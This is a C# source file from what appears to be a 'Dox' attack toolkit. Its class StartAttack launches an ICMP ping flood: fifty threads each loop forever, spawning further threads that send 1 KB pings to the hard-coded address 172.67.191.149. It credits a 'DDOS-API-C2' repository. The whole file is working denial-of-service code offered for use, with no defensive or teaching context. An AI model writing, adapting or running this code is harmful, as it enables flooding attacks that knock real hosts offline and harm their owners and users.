using System;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading;
namespace Dox.Components.Ddos
{
    public class StartAttack
    {

        // Credits: https://github.com/Addsada/DDOS-API-C2

        public static int amount = 0;
        public static int amountf = 0;
        public static void Get()
        {
            new Thread(() =>
            {
                for (int i = 0; i < 50; i++)
                {
                    icmpattack();
                }
            }).Start();
        }
        public static void icmpattack()
        {
            new Thread(() =>
            {
                Ping pingSender = new Ping();
                string data = generateStringSize(1024 * 1);
                byte[] sus = Encoding.ASCII.GetBytes(data);
                int timeout = 5000;
                PingOptions options = new PingOptions(64, true);
                for (; ; )
                {
                    new Thread(() =>
                    {
                        try
                        {
                            PingReply reply = pingSender.Send("172.67.191.149", timeout, sus, options);
                            Console.WriteLine($"[!] >> {reply.Status}");
                        }
                        catch
                        {
                            amountf++;
                        }
                    }).Start();
                }
            }).Start();
        }
        public static String generateStringSize(long sizeByte)
        {

            StringBuilder sb = new StringBuilder();
            Random rd = new Random();

            var numOfChars = sizeByte;
            string allows = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            int maxIndex = allows.Length - 1;
            for (int i = 0; i < numOfChars; i++)
            {
                int index = rd.Next(maxIndex);
                char c = allows[index];
                sb.Append(c);
            }
            return sb.ToString();
        }

    }
}